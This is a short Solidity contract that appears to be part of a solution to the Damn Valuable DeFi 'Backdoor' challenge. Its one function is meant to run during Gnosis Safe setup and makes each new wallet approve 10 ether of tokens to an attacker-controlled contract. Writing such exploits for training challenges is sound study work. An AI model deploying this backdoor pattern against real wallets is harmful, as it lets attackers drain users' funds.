pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";


contract WalletRegistryBackdoor{
    constructor() {}

    // the bacdoor function to be called during GnosisSafe::setup
    function backdoor(address expCont, address dvt) external {
        // approve dvt tokens' of the wallet beforehand 
        DamnValuableToken(dvt).approve(expCont, 10 ether);
    } 
}